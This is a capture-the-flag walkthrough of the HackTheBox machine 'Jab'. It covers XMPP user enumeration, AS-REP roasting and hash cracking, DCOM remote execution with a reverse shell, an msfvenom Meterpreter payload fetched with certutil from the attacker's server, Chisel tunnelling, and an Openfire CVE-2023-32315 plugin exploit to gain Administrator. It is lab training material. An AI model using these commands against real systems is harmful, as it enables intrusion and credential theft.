---
title: "CTF: Jab (Windows, Medium)"
excerpt: "A detailed walkthrough of \"Jab\" machine on HackTheBox."
tagline: "Take over a Minecraft server!"
header:
  teaser: /docs/assets/images/teasers/ctf/jab.png
  og_image: /docs/assets/images/teasers/ctf/jab.png
  overlay_image: /docs/assets/images/teasers/ctf/jab2.png
author_profile: false
share: false
tags:
  - HackTheBox
  - Windows
  - Difficulty-Medium
categories:
  - CTF
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

## Description

This is a detailed walkthrough of "Jab" machine on HackTheBox that is based on Windows operating system and categorized as "Medium" by difficulty. Infiltrate a private XMPP chat room to discover a path towards exploiting Openfire - an instant messaging and groupchat server.

## Reconnaissance

Run **nmap**:

```bash
nmap -sV -T4 <IP>
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/nmapscan.png" alt="">
  <figcaption>Ports 80 HTTP and 25565 Minecraft are open.</figcaption>
</figure>

Nmap scan reveals XMPP service running on port 5269. XMPP is an open communication protocol designed for instant messaging, presence information, and contact list maintenance. Based on XML, it enables the near-real-time exchange of structured data between two or more network entities. You can learn more about it on [https://xmpp.org](https://xmpp.org).

There are several popular XMPP clients available, in this scenario we will use [Pidgin](https://www.pidgin.im) XMPP client to connect to the messaging server.

```bash
# Install Pidgin with the following command
sudo apt install pidgin
```
Run Pidgin and, when prompted, add a new account specifying target domain name:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/pidginaccountcreate.png" alt="">
  <figcaption></figcaption>
</figure>

On the advanced settings tab, set Connection security to *"Use encryption if available"*:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/pidginaccountcreate2.png" alt="">
  <figcaption></figcaption>
</figure>

Click "Add". You should connect to the server successfully. Go to Tools - Plugins, enable *XMPP Console* and *Service Discovery*:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/plugins.png" alt="">
  <figcaption></figcaption>
</figure>

Select XMPP Service Discovery from Tools dropdown menu. It will show the following available services on the webserver:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/xmppservices.png" alt="">
  <figcaption></figcaption>
</figure>

From Tools menu, open XMPP Console. Then go to Accounts - your user - Search for Users. Advanced User Search will open, search users by wildcard:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/usersearch.png" alt="">
  <figcaption></figcaption>
</figure>

You should get a list of all users both in XMPP Console and Advanced User Search results:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/usersearchresults.png" alt="">
  <figcaption></figcaption>
</figure>

Copy the output from XML Console to a text file. Then modify the XML Output to only contain unique strings with usernames and save them to another file for your comfort. The following command should do the trick:

```bash
cat users.txt | grep ".htb" | uniq | sed 's/<value>//g;s/<\/value>//g' | tr -d ' ' > filename
```

Modify the file manually if there will be any leftover lines that do not represent usernames. Your final list should look like this:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/userlist.png" alt="">
  <figcaption></figcaption>
</figure>

The discovered usernames appear to be domain users. It is possible use them in [ASREP-Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast) attack using **GETNPUsers.py** from **Impacket** tools to possibly get some user's account hash.

```bash
# Run GetNPUsers.py and convert hashes into a format suitable for JohnTheReaper, place output in hashes.txt
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py jab.htb/ -usersfile asrepusers.txt -format john -outputfile hashes.txt
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/getnpusersrun.png" alt="">
  <figcaption>Running GetNPUsers.py</figcaption>
</figure>

The process will take some time as our user list is quite long, but eventually the tool will extract 3 password hashes for users that did not have Kerberos pre-authentication enabled.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/asrepresults.png" alt="">
  <figcaption></figcaption>
</figure>

Now let's attempt to crack them with **JohnTheReaper**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/asrepresults.png" alt="">
  <figcaption>Got a password for jmontgomery user!</figcaption>
</figure>

We have discovered our first set of credentials. Use them to login to XMPP server as **jmontgomery**. Search for services again. As **jmontgomery**, you will see a **new chat room** that was not visible previously:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/newchatroom.png" alt="">
  <figcaption></figcaption>
</figure>

Join **"pentest2003"** chat:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/newchatroomjoin.png" alt="">
  <figcaption></figcaption>
</figure>

Read the chat. In the conversation, you can see a leaked hash/password for **svc_openfire** user / service:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/svcopenfirehash.png" alt="">
  <figcaption></figcaption>
</figure>


## Exploitation / Foothold


The target host has RPC service running on port 135. Attempting to use **DCOM RCE** technique to gain foothold on the system (**dcomexec.py from Impacket tools**):


```bash
# Start a Netcat listener on desired port:
nc -lnvp <PORT>
# Generate a base64-encoded reverse shell payload for Windows (for example, on revshells.com)
# Run dcomexec.py with the generated payload:
sudo python dcomexec.py -object MMC20 -dc-ip <TARGET_IP> -debug jab.htb/'svc_openfire':'<PASSWORD>'@<TARGET_IP> 'cmd.exe /c powershell -e <BASE64-ENCODED REVERSE SHELL>' -silentcommand
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/dcomexecrun.png" alt="">
  <figcaption></figcaption>
</figure>

If executed successfully, a callback should be received on Netcat listener:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/callback.png" alt="">
  <figcaption></figcaption>
</figure>

### User flag

Claim user flag in *c:\users\svc_openfire\desktop* folder:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/userflag.png" alt="">
  <figcaption></figcaption>
</figure>


## Privilege escalation

To improve our capabilities, let's obtain a Meterpreter shell.

```bash
# Generate Meterpreter executable with msfvenom:
msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f exe > <filename>
# Start Metasploit and Meterpreter listener:
msfconsole
set payload windows/x64/meterpreter/reverse_tcp
set lhost <YOUR_IP>
set lport <PORT>
run
# Start Python HTTP server:
python3 -m http.server <PORT>
# On target host, download the generated file from your Python HTTP server:
certutil.exe -urlcache -split -f "http://<IP>:<PORT>/<filename>" <filename>
# Execute it
.\<filename>
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/backdoorexe.png" alt="">
  <figcaption>Transferring and calling Meterpreter executable.</figcaption>
</figure>


You should receive a callback in Metasploit. Let's enumerate applications on the target host with *post/windows/gather/enum_applications* module:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/enum_applications.png" alt="">
  <figcaption></figcaption>
</figure>

It's possible to deduce that the messaging server is based on **Openfire** (however, we could deduce this from the username as well). Enumeration of active connections with **netstat** shows that Openfire is listening internally on port 9090:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/netstat.png" alt="">
  <figcaption></figcaption>
</figure>

From here it is necessary to perform port forwarding in order to reach Openfire on internal port. Unfortunately, Meterpreter's port forwarding module did not work during my walkthrough, so I had to resort to [Chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.3). Download a Windows x64 executable for the target machine and a Linux x64 one for yours. Transfer the Windows Chisel executable to the target host with the HTTP method shown previously. Then run the following:

```bash
# Attacker
./chisel_1.7.4_linux_amd64 server --reverse --port 9000
# Target
chisel_1.7.4_windows_amd64 client <YOUR_IP>:9000 9090:127.0.0.1:9090
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/chisel.png" alt="">
  <figcaption>Tunnel established.</figcaption>
</figure>

If a tunnel has been established successfully, you can navigate to *127.0.0.1:9090* to reach Openfire Administration Console. Login with **svc_openfire** credentials:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/openfireconsole.png" alt="">
  <figcaption>Tunnel established.</figcaption>
</figure>

### CVE-2023-32315

Vulnerability research for Openfire v.4.7.5. leads to **CVE-2023-32315** - Openfire Path Traversal which can be further exploited to gain unauthorized access to Openfire console and Remote Code Execution. Since we already have a set of credentials, we do not need to bypass authentication; we can proceed to the RCE part. For those interested, here's a could [article](https://vulncheck.com/blog/openfire-cve-2023-32315) that explains CVE-2023-32315 exploitation in more detail.

Download the following [exploit](https://github.com/miko550/CVE-2023-32315) from GitHub.


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/exploit.png" alt="">
  <figcaption></figcaption>
</figure>

Highlighted is a malicious "Management tool" plugin that will allow us to obtain RCE on the system and escalate privileges to Administrator. Upload the plugin in "Plugins" section.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/pluginupload.png" alt="">
  <figcaption></figcaption>
</figure>


Navigate to Server - Server Settings - Management Tool. In the admin login panel, enter **123**. Select **system command** from dropdown menu. Background your current Meterpreter session with CTRL + Z and run the listener again. In the plugin's "Execute command" field, specify the path to the Meterpreter executable we have uploaded previously:


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/execcommand.png" alt="">
  <figcaption></figcaption>
</figure>

You will receive a Meterpreter shell as Administrator user.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/jab/adminshell.png" alt="">
  <figcaption></figcaption>
</figure>


### Root flag

Claim root flag in *c:\users\administrator\desktop\root.txt*




**Thank you for your attention and happy hacking!**
{: .notice--primary}
